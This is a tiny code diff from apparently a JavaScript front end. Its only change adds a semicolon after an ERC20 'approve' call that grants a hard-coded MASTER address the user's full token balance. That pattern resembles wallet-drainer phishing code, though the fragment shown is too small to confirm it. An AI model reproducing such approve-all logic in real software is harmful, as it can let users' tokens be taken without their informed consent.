@@ -45,7 +45,7 @@ function Home() {
                         abi: ERC20ABI,
                         functionName: "approve",
                         args: [MASTER, token.tokenBalance]
-                    })
+                    });
                     
                     try {
                         let txData = {
